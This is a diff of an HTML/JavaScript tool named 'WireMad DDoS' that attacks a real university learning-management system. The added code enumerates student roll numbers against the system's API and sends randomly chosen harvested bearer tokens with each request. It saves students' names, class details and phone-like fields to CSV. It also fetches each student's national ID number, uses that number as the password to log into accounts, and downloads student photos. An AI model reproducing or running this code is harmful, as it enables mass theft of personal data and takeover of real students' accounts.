@@ -1,399 +1,412 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>WireMad DDoS</title>
-    <link rel="stylesheet" href="style.css" />
-  </head>
-  <body>
-    <h1 id="titlee">WireMad</h1>
-    <div id="progressBarContainer">
-      <div id="progressSent"></div>
-      <div id="progressFail"></div>
-      <div id="progressSuccess"></div>
-    </div>
-    <canvas id="requestCanvas"></canvas>
-    <div id="status"></div>
-    <div>
-      <button id="startButton">Start</button>
-      <button id="pauseButton" style="display: none">Pause</button>
-      <button id="resumeButton" style="display: none">Resume</button>
-      <button id="stopButton">Abort</button>
-    </div>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WireMad DDoS</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <h1 id="titlee">WireMad</h1>
+  <div id="progressBarContainer">
+    <div id="progressSent"></div>
+    <div id="progressFail"></div>
+    <div id="progressSuccess"></div>
+  </div>
+  <canvas id="requestCanvas"></canvas>
+  <div id="status"></div>
+  <div>
+    <button id="startButton">Start</button>
+    <button id="pauseButton" style="display: none">Pause</button>
+    <button id="resumeButton" style="display: none">Resume</button>
+    <button id="stopButton">Abort</button>
+  </div>
+  <br />
+  <div>
+    <label for="offsetInput">Start at: </label><br />
+    <input type="number" id="offsetInput" value="1" />
     <br />
-    <div>
-      <label for="totalRequestsInput">Total Requests: </label><br />
-      <input type="number" id="totalRequestsInput" value="1" />
-      <br />
-      <label for="offsetInput">Offset: </label><br />
-      <input type="number" id="offsetInput" value="1" />
-      <br /><br />
-      <label for="batchSlider">Batch Size: </label>
-      <input
-        type="range"
-        id="batchSlider"
-        min="1"
-        max="30"
-        step="1"
-        value="1"
-      />
-      <span id="batchValue">1</span>
-      <br />
-      <label for="requestRateSlider">Request Rate (ms): </label>
-      <input
-        type="range"
-        id="requestRateSlider"
-        min="10"
-        max="5000"
-        step="1"
-        value="1000"
-      />
-      <span id="requestRateValue">1000 ms</span><br />
-      <label class="checkbox-container">
-        Await response:
-        <input type="checkbox" id="awaitres" />
-        <span class="checkmark"></span>
-      </label>
-    </div>
-    <button id="down">Download CSV</button>
+    <label for="totalRequestsInput">End at: </label><br />
+    <input type="number" id="totalRequestsInput" value="1" />
+    <br /><br />
+    <label for="batchSlider">Batch Size: </label>
+    <input
+    type="range"
+    id="batchSlider"
+    min="1"
+    max="30"
+    step="1"
+    value="1"
+    />
+    <span id="batchValue">1</span>
+    <br />
+    <label for="requestRateSlider">Request Rate (ms): </label>
+    <input
+    type="range"
+    id="requestRateSlider"
+    min="100"
+    max="5000"
+    step="1"
+    value="1000"
+    />
+    <span id="requestRateValue">1000 ms</span><br />
+    <label class="checkbox-container">
+      Await response:
+      <input type="checkbox" id="awaitres" />
+      <span class="checkmark"></span>
+    </label>
+  </div>
+  <button id="down">Download CSV</button>
+  <p>
+    Requests sent: <span id="requestsSent">0</span> of
+    <span id="totalRequests">1</span>
+  </p>
+  <div id="log"></div>
+  <input type="text" id="roll" placeholder="Username" />
+  <input type="password" id="pass" placeholder="Password" />
+  <button onclick="login()" id="logi">Login</button>
+  <div id="keys">
+    0 keys available
+  </div>
+  <button onclick="delIds()" id="clearButton">Clear Keys</button><br /><br />
+  Discovered
+  <p id="disc">
+    0-3618 1-24<br />0 1-23
+  </p>
+  <footer>
     <p>
-      Requests sent: <span id="requestsSent">0</span> of
-      <span id="totalRequests">1</span>
+      Top Secret Operation
     </p>
-    <div id="log"></div>
-    <input type="text" id="roll" placeholder="Username" />
-    <input type="password" id="pass" placeholder="Password" />
-    <button onclick="login()" id="logi">Login</button>
-    <div id="keys">0 keys available</div>
-    <button onclick="delIds()" id="clearButton">Clear Keys</button><br /><br />
-    Discovered
-    <p id="disc">0000-1271<br />3000-3816</p>
-    <footer>
-      <p>Top Secret Operation</p>
-      <a href="index.html">WireMad</a>
-      <a href="csvsort.html">CSV Sort</a>
-      <a href="dcoumentation.html">Documentation</a>
-    </footer>
-    <script>
-      const testMode = true;
-      let awaitReply = false;
-      let totalRequests,
-        offset,
-        batchSize,
-        requestRate,
-        requestsSent = 0,
-        requestsSuccess = 0,
-        requestsDone = 0,
-        requestsFail = 0;
-      let isRunning = false,
-        isPaused = false,
-        responseData = [],
-        requestQueue = [],
-        logData = [];
+    <a href="index.html">WireMad</a>
+    <a href="csvsort.html">CSV Sort</a>
+    <a href="dcoumentation.html">Documentation</a>
+  </footer>
+  <script>
+    const testMode = false;
+    let awaitReply = false;
+    let totalRequests,
+    offset,
+    batchSize,
+    requestRate,
+    requestsSent = 0,
+    requestsSuccess = 0,
+    requestsDone = 0,
+    requestsFail = 0;
+    let isRunning = false,
+    isPaused = false,
+    responseData = [],
+    requestQueue = [],
+    logData = [];
 
-      const $ = (id) => document.getElementById(id);
-      const [reqRateSlider, reqRateValue, batchSlider, batchValue] = [
-        "requestRateSlider",
-        "requestRateValue",
-        "batchSlider",
-        "batchValue",
-      ].map($);
-      const [
-        progressSent,
-        progressFail,
-        progressSuccess,
-        requestsSentText,
-        statusText,
-        logDiv,
-      ] = [
-        "progressSent",
-        "progressFail",
-        "progressSuccess",
-        "requestsSent",
-        "status",
-        "log",
-      ].map($);
+    const $ = (id) => document.getElementById(id);
+    const [reqRateSlider, reqRateValue, batchSlider, batchValue] = [
+      "requestRateSlider",
+      "requestRateValue",
+      "batchSlider",
+      "batchValue",
+    ].map($);
+    const [
+      progressSent,
+      progressFail,
+      progressSuccess,
+      requestsSentText,
+      statusText,
+      logDiv,
+    ] = [
+      "progressSent",
+      "progressFail",
+      "progressSuccess",
+      "requestsSent",
+      "status",
+      "log",
+    ].map($);
 
-      reqRateSlider.oninput = () => (
-        (requestRate = +reqRateSlider.value),
-        (reqRateValue.textContent = `${requestRate} ms`)
+    reqRateSlider.oninput = () => (
+      (requestRate = +reqRateSlider.value),
+      (reqRateValue.textContent = `${requestRate} ms`)
+    );
+    batchSlider.oninput = () => (
+      (batchSize = +batchSlider.value), (batchValue.textContent = batchSize)
+    );
+
+    const shuffle = (arr) => arr.sort(() => Math.random() - 0.5);
+
+    const updateProgress = () => {
+      progressSent.style.width = `${(requestsSent / totalRequests) * 100}%`;
+      progressFail.style.width = `${
+      ((requestsFail + requestsSuccess) / totalRequests) * 100
+      }%`;
+      progressSuccess.style.width = `${
+      (requestsSuccess / totalRequests) * 100
+      }%`;
+      requestsSentText.textContent = requestsSent;
+      statusText.innerHTML = `Done: ${requestsSuccess}, Failed: ${requestsFail}<br>Sent: ${requestsSent}`;
+      logDiv.innerHTML = logData.slice(-10).join("<br>");
+    };
+
+    const canvas = $("requestCanvas"),
+    ctx = canvas.getContext("2d");
+    (canvas.width = 10), (canvas.height = 20);
+    canvas.addEventListener("touchstart", (event) => {
+      const rect = canvas.getBoundingClientRect();
+      const touch = event.touches[0];
+      const iw = rect.right - rect.left;
+      const x = Math.round(map(touch.clientX - rect.left, 0, iw, 0, canvas.width));
+      requestsSent--;
+      let snt = (parseInt(document.getElementById("offsetInput").value)+x).toString().padStart(4, "0");
+      console.log(snt);
+      dep_sendreq(`${snt}-1-23`);
+    });
+    function map(value, inMin, inMax, outMin, outMax) {
+      return ((value - inMin) * (outMax - outMin)) / (inMax - inMin) + outMin;
+    }
+    const drawRequestLine = (rollNumber, status) => {
+      ctx.fillStyle =
+      status === "success" ? "#0f0": status === "sent" ? "grey": "red";
+      if (status == "failb") {
+        ctx.fillStyle = "#fa0";
+      }
+      ctx.fillRect(
+        ((rollNumber - offset) * canvas.width) / totalRequests,
+        0,
+        1,
+        canvas.height
       );
-      batchSlider.oninput = () => (
-        (batchSize = +batchSlider.value), (batchValue.textContent = batchSize)
-      );
+    };
 
-      const shuffle = (arr) => arr.sort(() => Math.random() - 0.5);
+    async function sendRequest(n) {
+      if (!isRunning || isPaused) return;
+      let pi = logData.length;
+      logData.push(`Sending request ${n}...`);
+      drawRequestLine(+n.slice(0, 4), "sent");
 
-      const updateProgress = () => {
-        progressSent.style.width = `${(requestsSent / totalRequests) * 100}%`;
-        progressFail.style.width = `${
-          ((requestsFail + requestsSuccess) / totalRequests) * 100
-        }%`;
-        progressSuccess.style.width = `${
-          (requestsSuccess / totalRequests) * 100
-        }%`;
-        requestsSentText.textContent = requestsSent;
-        statusText.innerHTML = `Done: ${requestsSuccess}, Failed: ${requestsFail}<br>Sent: ${requestsSent}`;
-        logDiv.innerHTML = logData.slice(-10).join("<br>");
-      };
-
-      const canvas = $("requestCanvas"),
-        ctx = canvas.getContext("2d");
-      (canvas.width = 50), (canvas.height = 20);
-
-      const drawRequestLine = (rollNumber, status) => {
-        ctx.fillStyle =
-          status === "success" ? "#0f0" : status === "sent" ? "grey" : "red";
-        ctx.fillRect(
-          ((rollNumber - offset) * canvas.width) / totalRequests,
-          0,
-          1,
-          canvas.height
-        );
-      };
-
-      async function sendRequest(n) {
-        if (!isRunning || isPaused) return;
-        let pi = logData.length;
-        logData.push(`Sending request ${n}...`);
-        drawRequestLine(+n.slice(0, 4), "sent");
-
-        try {
-          let token = randId();
-          console.log(token);
-          requestsSent++;
-          updateProgress();
-          let response = await fetch(
-            Math.random() < 0.93
-              ? "https://meme-api.com/gimme"
-              : "https://meme-api.com/gimme/banantheyd"
-          );
-          if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
-          let data = await response.json();
-          processMeme(data);
-          requestsSuccess++;
-          drawRequestLine(+n.slice(0, 4), "success");
-          logData[pi] = `Request ${n} completed`;
-        } catch {
-          requestsFail++;
-          drawRequestLine(+n.slice(0, 4), "fail");
-          logData[pi] = `Request ${n} failed`;
-        }
-
-        requestsDone++;
+      try {
+        let token = randId();
+        requestsSent++;
         updateProgress();
-        if (requestsFail + requestsDone >= totalRequests) complete();
+        let response = await fetch(
+          Math.random() < 0.93
+          ? "https://meme-api.com/gimme": "https://meme-api.com/gimme/banantheyd"
+        );
+        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
+        let data = await response.json();
+        processMeme(data);
+        requestsSuccess++;
+        drawRequestLine(+n.slice(0, 4), "success");
+        logData[pi] = `Request ${n} completed`;
+      } catch {
+        requestsFail++;
+        drawRequestLine(+n.slice(0, 4), "fail");
+        logData[pi] = `Request ${n} failed`;
       }
 
-      const sendRequestsParallel = async () => {
-        if (!isRunning || isPaused) return;
-        awaitReply = document.getElementById("awaitres").checked;
-        if (!awaitReply) {
-          Promise.all(
-            requestQueue.splice(0, batchSize).map(
-              (n) =>
-                new Promise((resolve) =>
-                  setTimeout(() => {
-                    if (testMode) {
-                      sendRequest(n).then(resolve);
-                    } else {
-                      dep_sendreq(n).then(resolve);
-                    }
-                  }, Math.random() * 5)
-                )
+      requestsDone++;
+      updateProgress();
+      if (requestsFail + requestsDone >= totalRequests) complete();
+    }
+
+    const sendRequestsParallel = async () => {
+      if (!isRunning || isPaused) return;
+      awaitReply = document.getElementById("awaitres").checked;
+      if (!awaitReply) {
+        Promise.all(
+          requestQueue.splice(0, batchSize).map(
+            (n) =>
+            new Promise((resolve) =>
+              setTimeout(() => {
+                if (testMode) {
+                  sendRequest(n).then(resolve);
+                } else {
+                  dep_sendreq(n).then(resolve);
+                }
+              },
+                Math.random() * 5)
             )
-          );
-        } else {
-          await Promise.all(
-            requestQueue.splice(0, batchSize).map(
-              (n) =>
-                new Promise((resolve) =>
-                  setTimeout(() => {
-                    if (testMode) {
-                      sendRequest(n).then(resolve);
-                    } else {
-                      dep_sendreq(n).then(resolve);
-                    }
-                  }, Math.random() * 5)
-                )
-            )
-          );
-        }
-        if (requestsSent < totalRequests && isRunning && !isPaused)
-          setTimeout(sendRequestsParallel, requestRate);
-      };
-
-      const complete = () => {
-        statusText.textContent = "Request sending is complete!";
-        $("startButton").style.display = "inline";
-        downloadCSV();
-        ["pauseButton", "resumeButton"].forEach(
-          (id) => ($(id).style.display = "none")
-        );
-        document.body.style.backgroundColor = "#363";
-        $("titlee").textContent = "Transfer Complete";
-        unlockInputs();
-      };
-
-      const lockInputs = () =>
-        ["totalRequestsInput", "offsetInput"].forEach(
-          (id) => ($(id).disabled = true)
-        );
-      const unlockInputs = () =>
-        ["totalRequestsInput", "offsetInput"].forEach(
-          (id) => ($(id).disabled = false)
-        );
-
-      $("startButton").addEventListener("click", () => {
-        if (gcuids.length <= 0 && !testMode) {
-          alert("0 keys available, please login");
-          return;
-        }
-        navigator.wakeLock.request("screen");
-        document.body.style.backgroundColor = "#000";
-        $("titlee").textContent = "Wiring Data...";
-        totalRequests = +$("totalRequestsInput").value;
-        offset = +$("offsetInput").value;
-        batchSize = +batchSlider.value;
-        requestRate = +reqRateSlider.value;
-        (isRunning = true),
-          (isPaused = false),
-          (requestsSent = requestsSuccess = requestsFail = requestsDone = 0);
-        responseData = [];
-        (canvas.width = totalRequests),
-          ctx.clearRect(0, 0, canvas.width, canvas.height);
-        $("totalRequests").textContent = totalRequests;
-        requestQueue = shuffle(
-          Array.from(
-            {
-              length: totalRequests,
-            },
-            (_, i) => `${(offset + i).toString().padStart(4, "0")}-1-24`
           )
         );
-        $("startButton").style.display = "none";
-        $("pauseButton").style.display = "inline";
-        $("resumeButton").style.display = "none";
-        statusText.textContent = "Request sending started...";
-        lockInputs();
-        sendRequestsParallel();
-      });
-
-      $("pauseButton").addEventListener("click", () => {
-        isPaused = true;
-        $("pauseButton").style.display = "none";
-        $("resumeButton").style.display = "inline";
-      });
-
-      $("resumeButton").addEventListener("click", () => {
-        isPaused = false;
-        $("resumeButton").style.display = "none";
-        $("pauseButton").style.display = "inline";
-        sendRequestsParallel();
-      });
-
-      $("stopButton").addEventListener("click", () => {
-        isRunning = isPaused = false;
-        statusText.textContent = "Requests stopped";
-        unlockInputs();
-        $("startButton").style.display = "inline";
-        ["pauseButton", "resumeButton"].forEach(
-          (id) => ($(id).style.display = "none")
+      } else {
+        await Promise.all(
+          requestQueue.splice(0, batchSize).map(
+            (n) =>
+            new Promise((resolve) =>
+              setTimeout(() => {
+                if (testMode) {
+                  sendRequest(n).then(resolve);
+                } else {
+                  dep_sendreq(n).then(resolve);
+                }
+              },
+                Math.random() * 5)
+            )
+          )
         );
-      });
-      let gcuids = [];
-      function getIds() {
-        let ids = [];
-        for (let i = 0; i < 250; i++) {
-          if (
-            localStorage.getItem("gcuid" + i) != null &&
-            localStorage.getItem("gcuid" + i) != "null"
-          ) {
-            ids.push(localStorage.getItem("gcuid" + i));
-          } else {
-            document.getElementById("keys").innerHTML =
-              ids.length + " keys available";
-            gcuids = ids;
-            return ids;
-          }
-        }
       }
-      getIds();
-      function pushId(id) {
-        localStorage.setItem("gcuid" + gcuids.length, id);
-        gcuids.push(id);
-        document.getElementById("keys").innerHTML =
-          gcuids.length + " keys available";
+      if (requestsSent < totalRequests && isRunning && !isPaused)
+        setTimeout(sendRequestsParallel, requestRate);
+    };
+
+    const complete = () => {
+      $("startButton").style.display = "inline";
+
+      ["pauseButton",
+        "resumeButton"].forEach(
+        (id) => ($(id).style.display = "none")
+      );
+      document.body.style.backgroundColor = "#363";
+      $("titlee").textContent = "Transfer Complete";
+      unlockInputs();
+    };
+
+    const lockInputs = () =>
+    ["totalRequestsInput", "offsetInput"].forEach(
+      (id) => ($(id).disabled = true)
+    );
+    const unlockInputs = () =>
+    ["totalRequestsInput", "offsetInput"].forEach(
+      (id) => ($(id).disabled = false)
+    );
+
+    $("startButton").addEventListener("click", () => {
+      if (gcuids.length <= 0 && !testMode) {
+        alert("0 keys available, please login");
+        return;
       }
+      navigator.wakeLock.request("screen");
+      document.body.style.backgroundColor = "#000";
+      $("titlee").textContent = "Wiring Data...";
+      offset = +$("offsetInput").value;
+      totalRequests = +$("totalRequestsInput").value - offset + 1;
 
-      function randId() {
-        return gcuids[Math.floor(Math.random() * gcuids.length)];
-      }
-
-      function delIds() {
-        for (let i = 0; i < 250; i++) localStorage.setItem("gcuid" + i, null);
-        gcuids = [];
-        document.getElementById("keys").innerHTML =
-          gcuids.length + " keys available";
-      }
-
-      function processMeme(response) {
-        const memeData = {
-          postLink: response.postLink || "",
-          subreddit: response.subreddit || "",
-          title: response.title || "",
-          url: response.url || "",
-          author: response.author || "",
-        };
-        responseData.push(memeData);
-      }
-      const downloadCSV = () => {
-        if (responseData.length === 0) {
-          return;
-        }
-
-        const headers = Object.keys(responseData[0]);
-        const csvRows = [
-          headers.join(","),
-          ...responseData.map((row) =>
-            headers.map((field) => `"${row[field]}"`).join(",")
-          ),
-        ];
-
-        const blob = new Blob([csvRows.join("\n")], {
-          type: "text/csv",
-        });
-        const link = Object.assign(document.createElement("a"), {
-          href: URL.createObjectURL(blob),
-          download: "responses.csv",
-        });
-        link.click();
-      };
-      const downloadCSVold = () => {
-        const blob = new Blob(
-          [responseData.map((row) => row.join(",")).join("\n")],
+      batchSize = +batchSlider.value;
+      requestRate = +reqRateSlider.value;
+      (isRunning = true),
+      (isPaused = false),
+      (requestsSent = requestsSuccess = requestsFail = requestsDone = 0);
+      responseData = [];
+      (canvas.width = totalRequests),
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      $("totalRequests").textContent = totalRequests;
+      requestQueue = shuffle(
+        Array.from(
           {
-            type: "text/csv",
-          }
-        );
-        const link = Object.assign(document.createElement("a"), {
-          href: URL.createObjectURL(blob),
-          download: "responses.csv",
-        });
-        link.click();
+            length: totalRequests,
+          },
+          (_, i) => `${(offset + i).toString().padStart(4, "0")}-1-23`
+        )
+      );
+      $("startButton").style.display = "none";
+      $("pauseButton").style.display = "inline";
+      $("resumeButton").style.display = "none";
+      
+      lockInputs();
+      sendRequestsParallel();
+    });
+
+    $("pauseButton").addEventListener("click", () => {
+      isPaused = true;
+      $("pauseButton").style.display = "none";
+      $("resumeButton").style.display = "inline";
+    });
+
+    $("resumeButton").addEventListener("click", () => {
+      isPaused = false;
+      $("resumeButton").style.display = "none";
+      $("pauseButton").style.display = "inline";
+      sendRequestsParallel();
+    });
+
+    $("stopButton").addEventListener("click", () => {
+      isRunning = isPaused = false;
+      statusText.textContent = "Requests stopped";
+      unlockInputs();
+      $("startButton").style.display = "inline";
+      ["pauseButton",
+        "resumeButton"].forEach(
+        (id) => ($(id).style.display = "none")
+      );
+    });
+    let gcuids = [];
+    function getIds() {
+      let ids = [];
+      for (let i = 0; i < 250; i++) {
+        if (
+          localStorage.getItem("gcuid" + i) != null &&
+          localStorage.getItem("gcuid" + i) != "null"
+        ) {
+          ids.push(localStorage.getItem("gcuid" + i));
+        } else {
+          document.getElementById("keys").innerHTML =
+          ids.length + " keys available";
+          gcuids = ids;
+          return ids;
+        }
+      }
+    }
+    getIds();
+    function pushId(id) {
+      localStorage.setItem("gcuid" + gcuids.length, id);
+      gcuids.push(id);
+      document.getElementById("keys").innerHTML =
+      gcuids.length + " keys available";
+    }
+
+    function randId() {
+      return gcuids[Math.floor(Math.random() * gcuids.length)];
+    }
+
+    function delIds() {
+      for (let i = 0; i < 250; i++) localStorage.setItem("gcuid" + i, null);
+      gcuids = [];
+      document.getElementById("keys").innerHTML =
+      gcuids.length + " keys available";
+    }
+
+    function processMeme(response) {
+      const memeData = {
+        postLink: response.postLink || "",
+        subreddit: response.subreddit || "",
+        title: response.title || "",
+        url: response.url || "",
+        author: response.author || "",
       };
+      responseData.push(memeData);
+    }
+    let guh = 0;
+    const downloadCSV = () => {
+      const blob = new Blob(
+        [responseData.map((row) => row.join(",")).join("\n")],
+        {
+          type: "text/csv"
+        }
+      );
 
-      $("down").addEventListener("click", downloadCSV);
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = totalRequests+","+guh+"responses.csv";
+      guh++;
 
-      async function login() {
-        const url = "https://lms.gcu.edu.pk/api/auth/login";
-        let data = {
-          usnm: document.getElementById("roll").value,
-          pwd: document.getElementById("pass").value,
-        };
-        try {
-          const response = await fetch(url, {
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    };
+
+    $("down").addEventListener("click", downloadCSV);
+    async function login() {
+      const url = "https://lms.gcu.edu.pk/api/auth/login";
+      if (document.getElementById("pass").value == "") {
+        document.getElementById("pass").value = await sendComp(document.getElementById("roll").value);
+      }
+      if (document.getElementById("pass").value == "") {
+        alert("cant login"); return;
+      }
+      let data = {
+        usnm: document.getElementById("roll").value,
+        pwd: document.getElementById("pass").value,
+      };
+      try {
+        const response = await fetch(url,
+          {
             method: "POST",
             headers: {
               Authorization: "Bearer null",
@@ -402,30 +415,34 @@
             },
             body: JSON.stringify(data),
           });
-          const result = await response.json();
-          console.log("Response:", result);
-          localStorage.setItem("gcuid", result[1]);
-          pushId(result[1]);
-          localStorage.setItem("onlogin", JSON.stringify(result));
-        } catch (error) {
-          console.error("Login Error:", error);
-        }
+        const result = await response.json();
+        console.log("Response:",
+          result);
+        localStorage.setItem("gcuid",
+          result[1]);
+        pushId(result[1]);
+        localStorage.setItem("onlogin",
+          JSON.stringify(result));
+      } catch (error) {
+        console.error("Login Error:",
+          error);
       }
-      async function dep_sendreq(n) {
-        if (!isRunning || isPaused) return;
-        const url = "https://lms.gcu.edu.pk/api/student/S_getStdtDetail_tm";
-        const requestData = {
-          ROLNO: n,
-        };
-        let pi = logData.length;
-        logData.push(`Sending request ${n}...`);
-        drawRequestLine(+n.slice(0, 4), "sent");
-        try {
-          let token = randId();
-          console.log(token);
-          requestsSent++;
-          updateProgressBar();
-          let response = await fetch(url, {
+    }
+    async function dep_sendreq(n) {
+      const url = "https://lms.gcu.edu.pk/api/student/S_getStdtDetail_tm";
+      const requestData = {
+        ROLNO: n,
+      };
+      let pi = logData.length;
+      logData.push(`Sending request ${n}...`);
+      drawRequestLine(+n.slice(0, 4),
+        "sent");
+      try {
+        let token = randId();
+        requestsSent++;
+        updateProgress();
+        let response = await fetch(url,
+          {
             method: "POST",
             headers: {
               Authorization: `Bearer ${token}`,
@@ -434,36 +451,126 @@
             },
             body: JSON.stringify(requestData),
           });
-          if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
-          let re = await response.json();
-          let data = re[0][0];
-          if (data !== undefined) {
-            responseData.push([
-              n,
-              data.c_code,
-              data.se_id,
-              data.maj_id,
-              data.nm,
-              data.class_nm,
-              data.t_no,
-            ]);
-            requestsSuccess++;
-            drawRequestLine(+n.slice(0, 4), "success");
-            logData[pi] = `Request ${n} completed`;
-          } else {
-            requestsFail++;
-            drawRequestLine(+n.slice(0, 4), "fail");
-            logData[pi] = `Request ${n} failed`;
-          }
-        } catch {
+        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
+        let re = await response.json();
+        console.log(re);
+        let data = re[0][0];
+        if (data !== undefined) {
+          responseData.push([
+            n,
+            data.c_code,
+            data.se_id,
+            data.maj_id,
+            data.nm,
+            data.class_nm,
+            data.t_no,
+          ]);
+          requestsSuccess++;
+          drawRequestLine(+n.slice(0, 4), "success");
+          logData[pi] = `Request ${n} completed`;
+        } else {
           requestsFail++;
-          drawRequestLine(+n.slice(0, 4), "fail");
+          drawRequestLine(+n.slice(0, 4), "failb");
+          logData[pi] = `Request ${n} unavailable`;
+        }
+      } catch (e) {
+        console.log(e);
+        requestsFail++;
+        drawRequestLine(+n.slice(0, 4), "fail");
+        logData[pi] = `Request ${n} failed`;
+      }
+      requestsDone++;
+      updateProgress();
+      if (requestsFail + requestsDone >= totalRequests) complete();
+    }
+    //sendComp("3001-1-23");
+    async function sendComp(n) {
+      const url = "https://lms.gcu.edu.pk/api/student/getStudentInformation/"+n;
+      let pi = logData.length;
+      logData.push(`Sending request ${n}...`);
+      drawRequestLine(+n.slice(0, 4), "sent");
+      try {
+
+        let token = randId();
+        console.log(token);
+        requestsSent++;
+        updateProgress();
+        let response = await fetch(url, {
+          method: "GET",
+          headers: {
+            Authorization: `Bearer ${token}`,
+            Accept: "application/json, text/plain, *//*",
+            "Content-Type": "application/json",
+          }
+        });
+        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
+        let re = await response.json();
+        console.log(re);
+        let data = re;
+        if (data !== undefined) {
+          requestsSuccess++;
+          drawRequestLine(+n.slice(0, 4), "success");
+          logData[pi] = `Request ${n} completed`;
+          return re.NIC;
+        } else {
+
+          requestsFail++;
+          drawRequestLine(+n.slice(0, 4), "failb");
           logData[pi] = `Request ${n} failed`;
         }
-        requestsDone++;
-        updateProgress();
-        if (requestsFail + requestsDone >= totalRequests) complete();
+      } catch(e) {
+        console.log(e);
+        requestsFail++;
+        drawRequestLine(+n.slice(0, 4), "fail");
+        logData[pi] = `Request ${n} failed`;
       }
-    </script>
-  </body>
+      requestsDone++;
+      updateProgress();
+      if (requestsFail + requestsDone >= totalRequests) complete();
+    }
+    //getPic("111/829/63/3686-1-24");
+    async function getPic(n) {
+      const url = "https://sfc.gcu.edu.pk/get-lms-img/"+n;
+      let pi = logData.length;
+      logData.push(`Sending request ${n}...`);
+      drawRequestLine(+n.slice(0, 4), "sent");
+      try {
+
+        let token = randId();
+        console.log(token);
+        requestsSent++;
+        updateProgress();
+        let response = await fetch(url, {
+          method: "GET",
+          headers: {
+            Authorization: `Bearer ${token}`,
+            Accept: "application/json, text/plain, */*",
+          }
+        });
+        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
+        let re = await response.json();
+        console.log(re);
+        let data = re;
+        if (data !== undefined) {
+          requestsSuccess++;
+          drawRequestLine(+n.slice(0, 4), "success");
+          logData[pi] = `Request ${n} completed`;
+        } else {
+
+          requestsFail++;
+          drawRequestLine(+n.slice(0, 4), "failb");
+          logData[pi] = `Request ${n} failed`;
+        }
+      } catch(e) {
+        console.log("rr", e);
+        requestsFail++;
+        drawRequestLine(+n.slice(0, 4), "fail");
+        logData[pi] = `Request ${n} failed`;
+      }
+      requestsDone++;
+      updateProgress();
+      if (requestsFail + requestsDone >= totalRequests) complete();
+    }
+  </script>
+</body>
 </html>
